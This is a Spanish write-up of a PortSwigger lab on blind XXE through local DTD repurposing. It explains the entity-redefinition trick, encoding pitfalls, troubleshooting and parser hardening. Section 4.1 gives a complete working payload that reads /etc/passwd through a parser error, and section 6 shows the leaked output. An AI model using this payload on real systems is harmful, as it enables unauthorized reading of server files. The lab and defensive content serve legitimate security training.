# Writeup: Exploiting XXE to retrieve data by repurposing a local DTD (PortSwigger)

- **Lab**: Exploiting XXE to retrieve data by repurposing a local DTD
- **URL**: https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd
- **Categoría**: XXE -> Blind, error-based, sin infraestructura externa (local DTD repurposing)
- **Dificultad**: Practitioner (la más alta de la serie)
- **Credenciales**: no requiere login

---

## 1. Objetivo

Mismo endpoint POST `/product/stock` con XML body, blind, errores verbosos del parser reflejados en respuesta. **Pero**: el lab **no provee exploit server**, y el firewall bloquea egress. No puedes hostear un DTD malicioso ni usar Collaborator. Hay que leer `/etc/passwd` con **infraestructura local únicamente**.

La técnica: **Local DTD Repurposing** (Yunusov & Osipov, 2018). Si en el filesystem del servidor existe **algún archivo `.dtd` legítimo**, puedes cargarlo desde `<!ENTITY % SYSTEM "file:///path/to/local.dtd">` y abusar sus declaraciones internas para que tu cadena maliciosa se ejecute. El DTD legítimo actúa como **trampolín**: tú no controlas su contenido, pero controlas el valor de uno de sus parameter entities vía pre-redefinición.

### Lo importante antes de tocar nada

- **Sin Collaborator, sin exploit server, sin red externa**: este es el escenario más restringido posible. La técnica resuelve esa restricción usando archivos locales.
- **Hint del lab**: PortSwigger te da el path exacto y el nombre del entity a redefinir. **Respetar ese hint, no inventar paths**. Para este lab: `/usr/share/yelp/dtd/docbookx.dtd` con entity `%ISOamso`. En otros labs (mismo técnica) puede variar.
- **GOTCHA crítico**: usar `&#x27;` (entidad numérica) y NO `&apos;` (nombrada). Parsers Java estrictos en contexto de DTD nested solo expanden numéricas. Si copias el payload con `&apos;` falla con el confuso error "system identifier must begin with quote" que parece de comillas mal puestas pero es de entidad no expandida.
- **Tres niveles de encoding**: `&#x25;` = `%`, `&#x26;` = `&`, `&#x27;` = `'`. Cada nivel de anidamiento de entidades requiere una capa de encoding adicional. Verás `&#x26;#x25;` (encoding doble de `%`) para la parte más profunda.

---

## 2. Diferencia con los labs XXE anteriores y por qué importa

Séptimo lab de la serie XXE; el más restringido en términos de infraestructura disponible.

| Lab | Infraestructura externa | Técnica |
|---|---|---|
| `retrieve-files` | No necesaria | DOCTYPE + general entity |
| `perform-ssrf` | No necesaria | Mismo + http:// para SSRF |
| `data-retrieval-via-error-messages` | **Exploit server** (whitelisted) | DTD remoto + parameter entities |
| `xinclude-attack` | No necesaria | XInclude (sin DOCTYPE) |
| `xxe-via-file-upload-svg` | No necesaria | SVG con DOCTYPE+ENTITY |
| **Este lab** | **NINGUNA** | **DTD local repurposed** |

La pregunta que el lab fuerza:

> ¿Qué haces cuando el firewall del entorno te impide hostear infra externa, pero igual necesitas armar una cadena de parameter entities anidadas?

La respuesta: usas un DTD que **el sysadmin instaló por otra razón** (típicamente como dependencia de algún paquete) y abusas que esos DTDs internamente declaran y referencian sus propios parameter entities. Si redefinís uno de esos antes de cargar el DTD, **tu valor sobrescribe el del DTD legítimo** y cuando el DTD lo expanda internamente, ejecuta tu payload.

El paper original ([Yunusov & Osipov 2018](https://github.com/GoSecure/dtd-finder)) trae un proyecto activo (`dtd-finder`) que mapea DTDs comunes en sistemas Linux y qué entity redefinir en cada uno. Para auditorías reales: enumerar paths conocidos de DTDs locales con XXE blind antes de rendirse.

---

## 3. La mecánica del "repurposing"

### 3.1 Por qué funciona la redefinición

XML 1.0 permite que un parameter entity se declare **múltiples veces**. Cuando ocurre, el parser **usa la primera declaración que vio**; las siguientes son ignoradas (silently). Spec: §4.4.1 de XML 1.0.

Esto es feature, no bug: permite "default values" en DTDs modulares (`<!ENTITY % x "default"> <!ENTITY % x "override">` → "default" gana). Pero abusable: si tú declaras `%ISOamso` con valor malicioso antes de que el DTD legítimo lo declare con su valor benigno, **tu valor gana**.

El trigger de tu cadena ocurre cuando el DTD legítimo, en algún punto interno, hace `%ISOamso;` esperando expandir su versión. Como tu versión es lo que está declarada, expandes tu cadena en ese contexto.

### 3.2 Por qué `docbookx.dtd` con `%ISOamso`

`docbookx.dtd` es el DTD principal de DocBook XML (formato de documentación técnica). Viene en distros con paquetes como `docbook-xml` o como dependencia de GNOME yelp. PortSwigger configuró el lab para que ese path exista.

`docbookx.dtd` internamente referencia ISO character entity sets para símbolos matemáticos, griegos, etc. Una de esas referencias es:

```xml
<!ENTITY % ISOamso PUBLIC "ISO 8879:1986//ENTITIES Added Math Symbols: Ordinary//EN" "isoamso.ent">
%ISOamso;
```

`ISOamso` = "ISO Added Math Symbols Ordinary". El DTD lo declara como referencia PUBLIC + SYSTEM y luego lo expande con `%ISOamso;`. Al redefinirlo previamente con nuestra cadena, ese `%ISOamso;` expande lo que queremos.

### 3.3 Por qué `&#x27;` y NO `&apos;` (gotcha que costó debugging)

XML define 5 entidades nombradas predefinidas: `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&apos;`. Funcionan en **document content** universalmente.

**En contexto de DTD entity values nested, NO funcionan en muchos parsers**. Apache Xerces (default en Java) en modo estricto solo expande entidades numéricas (`&#xHH;`) en valores de parameter entities. Las nombradas quedan literales.

Concretamente, si usas `&apos;` en:
```xml
<!ENTITY % eval "<!ENTITY &#x26;#x25; error SYSTEM &apos;file:///nonexistent/&#x25;file;&apos;>">
```

Xerces no expande `&apos;` a `'`. El parser ve, al expandir `%eval`:
```xml
<!ENTITY % error SYSTEM &apos;file:///nonexistent/...&apos;>
```

Donde `&apos;` queda literal. El parser intenta interpretar `&apos;file://...` como un SYSTEM identifier → no empieza con `"` ni `'` → error genérico:

```
org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 25;
The system identifier must begin with either a single or double quote character.
```

Confuso porque el error sugiere que **tú** olvidaste comillas, pero la realidad es que el parser **no expandió la entidad nombrada que las representaba**.

Fix: usar `&#x27;` (numérica de `'`, ASCII 0x27). Las numéricas se expanden en cualquier contexto.

**Lección reusable**: en payloads de XXE con DTD nesting, usar siempre numéricas (`&#x25;`, `&#x26;`, `&#x27;`, `&#x22;`). Nunca nombradas. Es la regla del paper de Yunusov & Osipov por una razón.

---

## 4. Diseño del ataque

### 4.1 Payload validado (one-line, ASCII puro)

```xml
<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### 4.2 Diseccionando la cadena

**Componente 1**: `<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">`. Declara la entidad que cargará el DTD local. No se resuelve aún.

**Componente 2**: `<!ENTITY % ISOamso '...'>`. Redefine `ISOamso` con nuestra cadena maliciosa **como string literal**. Aún no se ejecuta nada; solo guarda el valor. Las decodificaciones que ocurren al **declarar** este entity:
- Las `&#x25;` se decodifican a `%` (numérica de `%`).
- Pero el `&#x26;#x25;` (encoding doble) decodifica solo el `&#x26;` → `&`. Resultado: `&#x25;` literal queda dentro del valor. Eso protege esa capa para la siguiente expansión.
- `&#x27;` decodifica a `'` (comilla simple, abre/cierra el SYSTEM identifier interno).

Tras decodificación, el valor de `%ISOamso` es:
```
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;
```

**Componente 3**: `%local_dtd;`. Carga `docbookx.dtd`. El DTD legítimo intenta declarar `%ISOamso` (con su PUBLIC + SYSTEM identifiers apuntando a `isoamso.ent`), pero el parser ya tiene nuestra versión y la ignora. Más adelante, dentro de `docbookx.dtd`, hay un `%ISOamso;` que expande **nuestra cadena**.

**Componente 4 (cadena expandida)**: dentro del contexto del DTD, ahora se ejecuta:

1. `<!ENTITY % file SYSTEM "file:///etc/passwd">` — declara `file` apuntando a `/etc/passwd`.
2. `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">` — declara `eval` con string que es una declaración anidada. El `&#x25;` aquí decodifica a `%` solo cuando `eval` se expande.
3. `%eval;` — expande `eval`. La declaración anidada se ejecuta. Al construir el SYSTEM URL de `error`, expande `%file;` inline → fetch de `/etc/passwd` → SYSTEM URL = `file:///nonexistent/<contenido /etc/passwd>`.
4. `%error;` — intenta resolver esa URL. Path no existe → `FileNotFoundException` con el contenido completo del archivo en el mensaje.

**Resultado**: el server lab refleja el stack trace en respuesta HTTP 400. `/etc/passwd` aparece embebido en `"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash..."`.

---

## 5. Por qué funciona

### 5.1 La redefinición de parameter entities es feature de XML

XML 1.0 §4.4.1: parameter entities con declaraciones múltiples usan la primera. Documentado, deliberado, indispensable para DTDs modulares con defaults overrideables. La técnica abusa que ese mecanismo opera dentro de TODO el scope donde el DTD se procesa, incluyendo después de cargar otros DTDs.

Cualquier parser que respete el spec va a usar nuestra versión cuando aparezca primero. No hay "fix" del parser sin romper compatibilidad con DTDs legítimos.

### 5.2 DocBook DTDs son comunes y predecibles

`docbook-xml` viene como dependencia de cientos de paquetes Linux. Su path es estable (`/usr/share/yelp/dtd/docbookx.dtd` en sistemas con yelp, `/usr/share/xml/docbook/...` en otros). Sus parameter entities (`ISOamso`, `ISOdia`, `ISOgrk1`, etc.) son nombres estandarizados ISO 8879:1986 que llevan décadas sin cambiar.

Para auditorías reales, GoSecure mantiene `dtd-finder` ([github.com/GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder)) con base de datos de DTDs comunes en distros Linux y qué entity redefinir en cada uno. Si un server tiene XXE blind, hay una probabilidad muy alta de que **algún** DTD local sea repurposable.

### 5.3 `&apos;` no se expande en DTD entity values nested (el gotcha del día)

Spec XML 1.0 dice que las 5 entidades nombradas predefinidas funcionan en cualquier contexto donde se permitan referencias a entidades. **Pero**: en DTDs, dentro de un parameter entity value, las reglas de expansión son distintas y dependen de la implementación.

Apache Xerces (parser default en Java) en config estricto **solo expande character entity references numéricas** (`&#xHH;` o `&#NN;`) en `EntityValue` nested. Las entidades nombradas (incluso las predefinidas) quedan literales. Esto es un edge case del spec que distintas implementaciones interpretan distinto.

Consecuencia práctica: el payload canónico de la técnica usa **siempre** numéricas:
- `&#x25;` para `%` (no `&percnt;`).
- `&#x26;` para `&` (no `&amp;` en este contexto).
- `&#x27;` para `'` (no `&apos;`).
- `&#x22;` para `"` (no `&quot;`).

Si un payload "casi funcional" da el error `"system identifier must begin with quote"`, sospechar primero entidades nombradas no expandidas, no comillas mal escapadas.

---

## 6. Resolución

1. En Burp Repeater, en la petición POST `/product/stock` con `Content-Type: application/xml`, reemplazar el body por el payload de la sección 4.1.
2. Send. Respuesta llega como HTTP 400 con body:
   ```
   "XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   ... (resto de /etc/passwd)
   ```
3. Lab Solved automáticamente al detectar la lectura.

Si tras enviar:

- **`The system identifier must begin with either a single or double quote character`** (el error que más cuesta diagnosticar): casi seguro estás usando `&apos;` en lugar de `&#x27;`. Reemplazar todas las ocurrencias.
- **`No such file or directory: /usr/share/yelp/dtd/docbookx.dtd`**: el path no existe en este lab (improbable porque el hint lo confirma). Verificar typo en el path.
- **`Cannot redefine entity ISOamso`**: parser hardenado contra redefinición. La técnica no funciona contra ese parser; cambiar de DTD/entity (consultar `dtd-finder`).
- **Error reflejado pero sin contenido del archivo**: la cadena se rompió en algún paso. Verificar `&#x25;`, `&#x26;#x25;`, `&#x27;` exactos en posiciones correctas (copy-paste literal).

---

## 7. Resumen de la cadena

```mermaid
flowchart TB
    A[1. Atacante envia XML con DOCTYPE que declara %local_dtd y %ISOamso (cadena maliciosa)]
    B[2. Atacante hace %local_dtd; expandir: parser carga /usr/share/yelp/dtd/docbookx.dtd]
    C[3. docbookx.dtd intenta declarar %ISOamso con valor PUBLIC; parser ignora porque ya esta declarado]
    D[4. docbookx.dtd referencia %ISOamso; internamente; parser expande NUESTRA version]
    E[5. Nuestra cadena ejecuta: declara %file con SYSTEM /etc/passwd, declara %eval con declaracion anidada]
    F[6. %eval; expande: declara %error con SYSTEM file:///nonexistent/<contenido /etc/passwd>]
    G[7. %error; intenta resolver path inexistente, parser dispara FileNotFoundException]
    H[8. Stack trace contiene el path con el contenido del archivo embebido]
    I[9. Server lab refleja stack trace verbatim en respuesta HTTP 400]
    J[10. Atacante lee /etc/passwd dentro del mensaje de error]

    A --> B --> C --> D --> E --> F --> G --> H --> I --> J
```

Tres ideas para llevarse:

1. **XXE blind con cero infraestructura externa es resoluble si encuentras un DTD local repurposable**. Auditorías deberían enumerar paths conocidos antes de declarar el target "blind sin canal". `dtd-finder` de GoSecure es el catálogo de referencia. La técnica se generaliza: cualquier file XML/DTD/Schema en el filesystem del server con declaraciones internas que se referencian a sí mismas es candidato.
2. **`&apos;` y `&quot;` no son confiables en DTD entity values nested**. Usar siempre `&#x27;`, `&#x22;`. Si un payload da error de "system identifier must begin with quote", sospechar entidades nombradas no expandidas antes que comillas mal escritas. La regla universal de la técnica Yunusov/Osipov es "solo numéricas en posiciones nested".
3. **Redefinir parameter entities es feature, no bug**. La spec lo permite explícitamente para DTDs modulares con defaults. La técnica de attack abusa que el orden de declaración determina el valor expandido en TODO el scope, incluyendo después de cargar DTDs externos. No hay fix sin romper compatibilidad con DTDs legítimos; la mitigación correcta es deshabilitar resolución de external entities y external DTDs por completo.

---

## 8. Contramedidas

Defensas en orden de robustez:

1. **Deshabilitar external entities Y external DTD loading** en el parser. Es la fix de raíz: si el parser no carga DTDs externos, no puede cargar DTDs locales con `file://` tampoco.
   ```java
   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
   factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
   ```
   El último feature (`load-external-dtd`) es el que específicamente bloquea la carga de `/usr/share/yelp/dtd/docbookx.dtd`. Sin él, los otros features no son suficientes contra esta técnica.
2. **Eliminar verbosidad de errores en respuestas HTTP**. Ortogonal pero crítica. Stack traces nunca deberían llegar al cliente. Loguear server-side, devolver error genérico con correlation ID. Esta defensa mitiga vectores futuros que aún no anticipas.
3. **Sandbox de filesystem para el proceso del parser**. Si el parser corre como usuario que no puede leer `/etc/passwd` ni `/usr/share/yelp/dtd/`, el ataque falla aunque las features del parser no estén bien configuradas. Defense in depth real.
4. **Egress filtering desde el host de aplicación** (no aplica directamente acá porque el ataque es 100% local, pero relevante para variantes que hacen HTTP).
5. **WAF con reglas anti-DOCTYPE**. Mitigación reactiva. Detectar `<!DOCTYPE` con `<!ENTITY` en bodies XML es señal de payload XXE. Bypass con encoding/normalización; no sustituye fix de raíz.
6. **Migrar a JSON o protobuf**. Sin equivalente en formatos modernos. Reducción de superficie generacional.

---

## 9. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Exploiting XXE to retrieve data by repurposing a local DTD*. https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd
- PortSwigger Web Security Academy. (s.f.). *Blind XXE injection*. https://portswigger.net/web-security/xxe/blind
- Yunusov, T. & Osipov, A. (2018). *XXE OOB exploitation at Java 1.7+*. https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
- GoSecure. (s.f.). *dtd-finder: List DTDs and generate XXE payloads using those local DTDs*. https://github.com/GoSecure/dtd-finder
- W3C. (2008). *Extensible Markup Language (XML) 1.0 (Fifth Edition) - Section 4.4.1*. https://www.w3.org/TR/xml/#sec-entity-decl
- W3C. (2008). *XML 1.0 - Predefined Entities (§4.6)*. https://www.w3.org/TR/xml/#sec-predefined-ent
- Apache Xerces. (s.f.). *Features and Properties documentation*. https://xerces.apache.org/xerces2-j/features.html
- OWASP Foundation. (s.f.). *XML External Entity Prevention Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- Writeups previos de la serie XXE:
  - [`learning/portswigger/exploiting-xxe-to-retrieve-files/writeup.md`](../exploiting-xxe-to-retrieve-files/writeup.md)
  - [`learning/portswigger/exploiting-xxe-to-perform-ssrf/writeup.md`](../exploiting-xxe-to-perform-ssrf/writeup.md)
  - [`learning/portswigger/blind-xxe-data-retrieval-via-error-messages/writeup.md`](../blind-xxe-data-retrieval-via-error-messages/writeup.md)
  - [`learning/portswigger/xinclude-attack-retrieve-files/writeup.md`](../xinclude-attack-retrieve-files/writeup.md)
  - [`learning/portswigger/xxe-via-file-upload-svg/writeup.md`](../xxe-via-file-upload-svg/writeup.md)
- Inventario interno: [`inventario/03-analisis-vulnerabilidades/web/analisis-xxe.md`](../../../inventario/03-analisis-vulnerabilidades/web/analisis-xxe.md)